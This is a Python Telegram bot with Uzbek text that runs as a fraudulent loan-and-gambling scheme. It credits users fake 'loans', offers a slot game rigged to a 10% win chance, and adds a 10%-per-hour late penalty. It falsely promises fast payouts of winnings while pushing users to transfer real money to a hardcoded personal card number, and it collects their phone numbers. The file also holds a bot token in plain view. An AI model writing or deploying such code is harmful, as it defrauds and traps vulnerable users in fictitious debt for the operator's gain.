import asyncio
import logging
import random
import json
import os
import re
from datetime import datetime
from decimal import Decimal
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- 1. SOZLAMALAR ---
TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE'
ADMIN_ID = 8299021738
ADMIN_KARTA = "9860 6067 5582 9722" # Sizning shaxsiy kartangiz
DB_FILE = "system_database.json"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

# --- 2. MA'LUMOTLARNI SAQLASH ---
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            for uid in data:
                data[uid]['balance'] = Decimal(str(data[uid].get('balance', 0)))
                data[uid]['loan'] = Decimal(str(data[uid].get('loan', 0)))
            return data
    return {}

def save_db(data):
    to_save = {}
    for uid, val in data.items():
        to_save[uid] = val.copy()
        to_save[uid]['balance'] = float(val['balance'])
        to_save[uid]['loan'] = float(val['loan'])
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(to_save, f, indent=4, ensure_ascii=False)

users = load_db()

def get_u(uid):
    uid = str(uid)
    if uid not in users:
        users[uid] = {'name': '', 'phone': '', 'reg': False, 'balance': Decimal('0.0'), 'loan': Decimal('0.0'), 'loan_time': None}
    return users[uid]

def get_finance(uid):
    u = get_u(uid)
    if not u['loan'] or u['loan'] <= 0: return Decimal('0.0'), Decimal('0.0'), Decimal('0.0')
    l_time = datetime.strptime(u['loan_time'], "%Y-%m-%d %H:%M:%S")
    passed_hours = (datetime.now() - l_time).total_seconds() / 3600
    penya = Decimal('0.0')
    if passed_hours > 12:
        # Har soat kechikish uchun 10% penya
        penya = (u['loan'] * Decimal('0.10') * Decimal(str(passed_hours - 12))).quantize(Decimal('0.01'))
    return u['loan'], penya, (u['loan'] + penya).quantize(Decimal('0.01'))

# --- 3. KLAVIATURALAR ---
def main_kb():
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🎰 O'YINNI BOSHLASH"), types.KeyboardButton(text="💰 HISOBIM"))
    builder.row(types.KeyboardButton(text="💵 TEZKOR QARZ OLISH (LIMIT: 1M) 💵"))
    builder.row(types.KeyboardButton(text="🏦 QARZNI YOPISH"))
    return builder.as_markup(resize_keyboard=True)

# --- 4. RO'YXATDAN O'TISH ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    u = get_u(message.from_user.id)
    if not u['reg']:
        await message.answer("🚀 **Xush kelibsiz!**\n\nQarz olib o'yin o'yna va boyib ket! Yutgan pullaringni 5 daqiqada karta raqamingga tushirib beramiz.\n\nBoshlash uchun Ismingizni yuboring:")
    else:
        await message.answer("Tizim tayyor!", reply_markup=main_kb())

@dp.message(lambda m: not get_u(m.from_user.id)['reg'] and not m.contact)
async def reg_name(message: types.Message):
    uid = str(message.from_user.id)
    users[uid]['name'] = message.text
    save_db(users)
    kb = ReplyKeyboardBuilder().row(types.KeyboardButton(text="✅ RAQAMNI TASDIQLASH", request_contact=True))
    await message.answer("Rahmat! Endi raqamingizni tasdiqlang:", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.contact)
async def reg_contact(message: types.Message):
    uid = str(message.from_user.id)
    if message.contact.user_id == message.from_user.id:
        users[uid]['phone'] = message.contact.phone_number
        users[uid]['reg'] = True
        save_db(users)
        await message.answer("✅ Shaxsingiz tasdiqlandi. Limit: 1 000 000 UZS. O'yinni boshlang!", reply_markup=main_kb())

# --- 5. QARZ OLISH ---
@dp.message(F.text == "💵 TEZKOR QARZ OLISH (LIMIT: 1M) 💵")
async def loan_offer(message: types.Message):
    u = get_u(message.from_user.id)
    if u['loan'] > 0: return await message.answer("⚠️ Avvalgi qarzingizni yoping!")
    
    kb = InlineKeyboardBuilder()
    kb.row(types.InlineKeyboardButton(text="💸 500 000 UZS", callback_data="get_500000"))
    kb.row(types.InlineKeyboardButton(text="💸 1 000 000 UZS", callback_data="get_1000000"))
    await message.answer("Qancha qarz olmoqchisiz? Tanlang:", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("get_"))
async def process_loan(call: types.CallbackQuery):
    uid = str(call.from_user.id)
    amt = Decimal(call.data.split("_")[1])
    users[uid]['loan'] = amt
    users[uid]['balance'] += amt
    users[uid]['loan_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_db(users)
    await call.message.edit_text(f"✅ {amt} UZS hisobingizga tushdi. Boyib ketish vaqti keldi!")

# --- 6. O'YIN (YUTISH 10%) ---
@dp.message(F.text == "🎰 O'YINNI BOSHLASH")
async def start_game(message: types.Message):
    u = get_u(message.from_user.id)
    bet = Decimal('100000.0')
    if u['balance'] < bet: return await message.answer("⚠️ Balansingizda pul qolmagan. Qarz oling!")

    u['balance'] -= bet
    save_db(users)
    await message.answer_dice("🎰")
    await asyncio.sleep(4)

    if random.random() < 0.10: # YUTISH EHTIMOLI 10%
        win = Decimal(str(random.uniform(105000, 110000))).quantize(Decimal('0.01'))
        u['balance'] += win
        await message.answer(f"🎉 YUTUQ! +{win} UZS! Balans: {u['balance']} UZS")
    else:
        await message.answer(f"😟 Omad kelmadi. Yana urinib ko'ring! Balans: {u['balance']} UZS")
    save_db(users)

# --- 7. QARZNI YOPISH (TO'LOV TIZIMI) ---
@dp.message(F.text == "🏦 QARZNI YOPISH")
async def pay_loan(message: types.Message):
    l, p, total = get_finance(message.from_user.id)
    if total <= 0: return await message.answer("Sizning qarzingiz yo'q.")
    
    await message.answer(
        f"🚨 **QARZNI TO'LASH BO'LIMI**\n\n"
        f"To'lov miqdori: {total} UZS\n"
        f"Karta raqami: `{ADMIN_KARTA}`\n\n"
        f"To'lamoqchi bo'lgan summani yozib yuboring:")
    users[str(message.from_user.id)]['pay_step'] = 'amount'
    save_db(users)

@dp.message(lambda m: get_u(m.from_user.id).get('pay_step') == 'amount')
async def pay_amount(message: types.Message):
    uid = str(message.from_user.id)
    try:
        amt = Decimal(re.sub(r'\D', '', message.text))
        users[uid]['temp_pay'] = str(amt)
        users[uid]['pay_step'] = 'confirm'
        save_db(users)
        
        kb = ReplyKeyboardBuilder()
        kb.row(types.KeyboardButton(text="Pul tashladim ✅"), types.KeyboardButton(text="Orqaga ❌"))
        await message.answer(f"Summa: {amt} UZS\nKarta: {ADMIN_KARTA}\n\nTo'lovni amalga oshirgan bo'lsangiz tugmani bosing:", reply_markup=kb.as_markup(resize_keyboard=True))
    except:
        await message.answer("Faqat raqam yozing!")

@dp.message(F.text == "Pul tashladim ✅")
async def notify_admin(message: types.Message):
    uid = str(message.from_user.id)
    u = users[uid]
    if u.get('pay_step') == 'confirm':
        amt = u.get('temp_pay')
        kb = InlineKeyboardBuilder()
        kb.row(types.InlineKeyboardButton(text="Tasdiqlayman ✅", callback_data=f"adm_ok_{uid}"),
               types.InlineKeyboardButton(text="Tasdiqlamayman ❌", callback_data=f"adm_no_{uid}"))
        
        await bot.send_message(ADMIN_ID, f"💰 **PUL TUSHDI!**\nMijoz: {u['name']}\nTel: {u['phone']}\nSumma: {amt} UZS", reply_markup=kb.as_markup())
        await message.answer("⌛️ To'lovingiz tekshirilmoqda. Iltimos, 5 daqiqa kuting...", reply_markup=main_kb())
        u['pay_step'] = None
        save_db(users)

@dp.message(F.text == "Orqaga ❌")
async def go_back(message: types.Message):
    uid = str(message.from_user.id)
    users[uid]['pay_step'] = None
    save_db(users)
    await message.answer("Bekor qilindi.", reply_markup=main_kb())

@dp.callback_query(F.data.startswith("adm_"))
async def admin_decision(call: types.CallbackQuery):
    action = call.data.split("_")[1]
    uid = call.data.split("_")[2]
    
    if action == "ok":
        users[uid]['loan'] = Decimal('0.0')
        users[uid]['loan_time'] = None
        save_db(users)
        await bot.send_message(uid, "✅ To'lovingiz tasdiqlandi! Qarzingiz butunlay yopildi. Endi yutuqlaringizni yechib olishingiz mumkin.")
        await call.message.edit_text("Tasdiqlandi ✅")
    else:
        await bot.send_message(uid, "❌ To'lov tasdiqlanmadi. Iltimos, chekni tekshiring yoki qaytadan yuboring.")
        await call.message.edit_text("Rad etildi ❌")

# --- 8. HISOB ---
@dp.message(F.text == "💰 HISOBIM")
async def my_acc(message: types.Message):
    l, p, total = get_finance(message.from_user.id)
    u = get_u(message.from_user.id)
    await message.answer(f"💵 Balans: {u['balance']} UZS\n🛑 Qarz: {total} UZS\n\n(Eslatma: Kechikkan har soat uchun 10% penya qo'shiladi!)")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())


